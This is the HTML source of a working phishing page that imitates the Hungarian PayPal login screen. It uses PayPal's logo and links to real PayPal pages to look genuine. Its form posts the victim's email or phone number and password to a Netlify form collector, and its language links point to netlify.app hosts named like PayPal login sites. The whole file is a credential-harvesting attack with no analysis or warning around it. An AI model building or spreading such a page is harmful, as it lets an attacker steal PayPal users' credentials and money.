<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="index.css" />
	<title>Bejelentkéz a PayPal-számlára</title>


	<script>
function myFunction() {
  var x = document.getElementById("passord");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}
</script>

	
</head>
<body>
	<div id="login">
		<div id="ramme">
		<img id="logo" src="https://logos-world.net/wp-content/uploads/2020/08/PayPal-Symbol.png" height=33>
		<br>

			<form name="contact" method="POST" data-netlify="true">
  <input type="hidden" name="form-name" value="contact" />
  
  <input type="text" name="brukernavn" id="brukernavn" placeholder="E-mail-cím vagy mobilszám">
  
  <br>
  
  <input type="password" name="passord" id="passord" placeholder="Jelszó">
  
  <br>
  <br>
				<div id="glemt">
  <a href="https://www.paypal.com/authflow/password-recovery/?country.x=HU&locale.x=hu_HU&redirectUri=%252Fsignin%253Fcountry.x%253DHU%2526locale.x%253Dhu_HU%2526langTgl%253Dhu" id="forgot">Elfelejtette a jelszavát?</a>
					</div>
  <br>
  <br>
  <button id="loginknapp">Bejelentkéz</button>
</form>

		
		
		<br>
		<br>
		<p id="linje"><span>vagy</span></p>
		<br>
			<a href="https://www.paypal.com/hu/webapps/mpp/account-selection">
		<button id="nyknapp">
			Regisztráció
		</button>
			</a>
		<br>
		<br>
		<br>
		<br>
		<br>
		
		<div id="sprakboks">
		<a id="lan1" href="https://paypal-login-site.netlify.app/">Magyar</a>
			<img id="vert" src="https://t3.ftcdn.net/jpg/03/63/34/70/360_F_363347020_YzZc2x3LI8fTfVXvGVPTXTrkOAJ1MR4l.jpg" height="20" width="15">
			<a id="lan2" href="https://paypal-loginsite.netlify.app/">English</a>
			</div>

		

	</div>
	
	</div>






</body>
